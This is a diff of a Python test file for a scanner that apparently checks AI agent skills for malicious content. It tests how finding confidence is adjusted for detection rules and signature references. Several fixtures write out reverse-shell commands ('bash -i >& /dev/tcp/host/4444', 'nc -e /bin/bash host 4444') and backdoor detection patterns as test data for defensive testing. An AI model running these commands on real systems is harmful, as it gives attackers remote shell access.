@@ -190,12 +190,14 @@ def test_clean_skill_zero_score(make_inline_skill):
 # --- Confidence adjustment tests ---
 
 
-def test_confidence_reduced_for_security_tools(make_inline_skill):
-    """Findings in security tools have reduced confidence."""
+def test_security_tool_identity_annotates_but_does_not_reduce_confidence(
+    make_inline_skill,
+):
+    """A defensive-looking name must not become an evasion mechanism."""
     findings = [_make_finding("INJECT-002"), _make_finding("EXEC-001")]
     adjusted = adjust_finding_confidence(findings, security_tool_score=0.7)
     for f in adjusted:
-        assert f.confidence < 0.5
+        assert f.confidence == 1.0
         assert f.context_note is not None
         assert "security tool" in f.context_note
 
@@ -255,6 +257,7 @@ def test_detection_rule_literal_is_low_confidence(make_inline_skill):
             "scripts/guard.py": (
                 "_BLOCKED = {\n"
                 '    "pattern": r"bash -i >& /dev/tcp/",\n'
+                '    "reason": "Blocks bash -i >& /dev/tcp/",\n'
                 '    "example": "bash -i >& /dev/tcp/host/4444",\n'
                 "}\n"
             )
@@ -299,6 +302,75 @@ def test_bundled_markdown_does_not_reuse_root_section_line_numbers(make_inline_s
     assert adjusted[0].confidence == 1.0
 
 
+def test_explicit_defensive_signature_reference_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={
+            "references/threat-patterns.md": (
+                "# Threat Patterns Reference\n\n"
+                "What it catches: reverse shells.\n\n"
+                "`nc -e /bin/bash host 4444`\n"
+            )
+        }
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "references" / "threat-patterns.md"
+    finding.line_number = 5
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.4, skill=skill)
+    assert adjusted[0].confidence == 0.1
+    assert "defensive signature reference" in (adjusted[0].context_note or "")
+
+
+def test_signature_filename_alone_does_not_lower_confidence(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={"references/threat-patterns.md": "Run `nc -e /bin/bash host 4444`."}
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "references" / "threat-patterns.md"
+    finding.line_number = 1
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.4, skill=skill)
+    assert adjusted[0].confidence == 1.0
+
+
+def test_static_detection_collection_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={
+            "scripts/scanner.py": (
+                "BACKDOOR_PATTERNS = [\n"
+                '    (re.compile(r"nc -e /bin/bash"), "critical"),\n'
+                "]\n"
+            )
+        }
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "scripts" / "scanner.py"
+    finding.line_number = 2
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.4, skill=skill)
+    assert adjusted[0].confidence == 0.1
+    assert "static detection collection" in (adjusted[0].context_note or "")
+
+
+def test_static_extension_set_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={"scripts/scanner.py": 'TEXT_EXTENSIONS = {\n    ".env", ".json",\n}\n'}
+    )
+    finding = _make_finding("EXFIL-001")
+    finding.file_path = skill.path / "scripts" / "scanner.py"
+    finding.line_number = 2
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.4, skill=skill)
+    assert adjusted[0].confidence == 0.1
+
+
+def test_generic_command_collection_is_not_trusted(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={"scripts/runner.py": 'COMMANDS = ["nc -e /bin/bash host 4444"]\n'}
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "scripts" / "runner.py"
+    finding.line_number = 1
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.4, skill=skill)
+    assert adjusted[0].confidence == 1.0
+
+
 def test_evals_file_is_low_confidence(make_inline_skill):
     skill = make_inline_skill()
     finding = _make_finding("EXEC-001", severity=Severity.CRITICAL)
@@ -320,8 +392,8 @@ def test_detection_section_is_low_confidence_without_global_score(make_inline_sk
     assert "detection section" in (adjusted[0].context_note or "")
 
 
-def test_net002_confidence_never_reduced():
-    """NET-002 findings always keep full confidence."""
+def test_security_identity_does_not_reduce_any_active_finding():
+    """Neither IOC nor execution evidence is weakened by claimed identity."""
     findings = [
         _make_finding("NET-002", category=FindingCategory.NETWORK),
         _make_finding("EXEC-001", category=FindingCategory.EXECUTION),
@@ -330,7 +402,7 @@ def test_net002_confidence_never_reduced():
     net002 = [f for f in adjusted if f.rule_id == "NET-002"][0]
     exec001 = [f for f in adjusted if f.rule_id == "EXEC-001"][0]
     assert net002.confidence == 1.0
-    assert exec001.confidence < 0.5
+    assert exec001.confidence == 1.0
 
 
 def test_verdict_review_when_all_low_confidence(make_inline_skill):
@@ -412,8 +484,8 @@ def test_single_critical_primitive_is_suspicious_not_malicious():
     assert result.verdict == "SUSPICIOUS"
 
 
-def test_probable_security_scanner_routes_to_review():
-    """Signature libraries must not become a malicious-author classification."""
+def test_security_tool_score_alone_does_not_suppress_an_attack_chain():
+    """Only structural context, never claimed identity, can lower confidence."""
     from waingro.models import ScanResult, SkillMetadata
 
     result = ScanResult(
@@ -434,7 +506,7 @@ def test_probable_security_scanner_routes_to_review():
         security_tool_score=0.8,
     )
 
-    assert result.verdict == "REVIEW"
+    assert result.verdict == "MALICIOUS"
 
 
 def test_corroborating_attack_stages_must_share_a_file():
